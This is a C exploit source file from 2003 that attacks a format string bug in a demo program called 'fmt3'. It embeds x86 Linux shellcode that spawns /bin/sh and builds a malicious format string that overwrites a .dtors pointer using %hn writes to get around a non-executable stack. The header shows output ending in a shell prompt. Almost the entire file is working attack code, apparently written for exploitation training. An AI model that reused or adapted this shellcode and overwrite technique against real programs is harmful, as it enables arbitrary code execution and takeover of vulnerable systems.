/*
 * $Id: fmt3-ex.c,v 1.1.1.1 2004/05/29 14:15:04 raptor Exp $
 *
 * fmt3-ex.c - fmt3.c exploit (format string exploitation)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit bypasses non-executable stack protections (it was tested on 
 * Linux/Owl), putting our shellcode in the calloc()ed user-supplied buffer.
 * 
 * $ readelf -a fmt3 | grep dtors
 *   [18] .dtors            PROGBITS        080495dc 0005dc 000008 00  WA [...]
 *                                          ^^^^^^^^\__(.dtors section address)
 * $ ltrace fmt3 a 2>&1 | grep alloc
 * calloc(1, 1)                                      = 0x080496d8
 *               (address of the usr buffer in heap)__/^^^^^^^^^^
 * 
 * Usage: ./fmt1-ex7 <offset to first address> (default = 8)
 *
 * $ uname -a
 * Linux dns 2.2.25 #1 Fri Mar 21 15:24:20 CET 2003 i686 unknown
 * $ gcc --version
 * 2.95.3
 * $ ./fmt3-ex 
 * Using .dtors address    : 0x80495e0
 * Using ret address       : 0x80496e0
 * [...]
 * sh-2.05$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN		"./fmt3"	// this is the vulnerable program
#define BUF		1024		// max size of the malicious buffer
#define	RET		0x080496d8 + 8	// vulnerable buffer address + 8
#define	DTORS		0x080495dc + 4	// address of first pointer in .dtors
#define	OFFSET		8		// offset to first address on stack

/* split an address in 2 words */
#define SPLITW( w1, w2, addr ) {	\
	w1 = (addr & 0x0000ffff);	\
	w2 = (addr & 0xffff0000) >> 16;	\
}

char sc[] = /* linux/x86 shellcode (24 bytes) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
	char 	buf[BUF];
	int 	offset = OFFSET, ret = RET;
	int 	base, n1, n2, ret1, ret2;

	char 	*p = buf;

	/* check command line for offsets */
	if (argc > 1)
		offset = atoi(argv[1]);

	/* split the ret address in 2 words */
	SPLITW(ret1, ret2, ret);

	/* initialize the malicious buffer */
	bzero(buf, BUF);

	/* address part of the format string */
	*((void **)p) = (void *)(DTORS);
	p += 4;
	*((void **)p) = (void *)(DTORS + 2);
	p += 4;

	base = strlen(buf) + strlen(sc);

	/* calculate numeric arguments for the write string */
	n1 = (ret1 - base)		% 0x10000;
	n2 = (ret2 - base - n1) 	% 0x10000;

	/* check for potentially dangerous numeric arguments below 10 */
	n1 += (n1 < 10) ? (0x10000) : (0);
	n2 += (n2 < 10) ? (0x10000) : (0);

	/* build the write string part of the format string */
	sprintf(p, "%s%%.%du%%%d$hn%%.%du%%%d$hn", sc, n1, offset, n2, offset + 1);

	/* print some output */
	fprintf(stderr, "Using .dtors address\t: %p\n", DTORS);
	fprintf(stderr, "Using ret address\t: %p\n\n", ret);

	/* run the vulnerable program */
	execl(VULN, VULN + 2, buf, NULL);
	perror("execl");
}
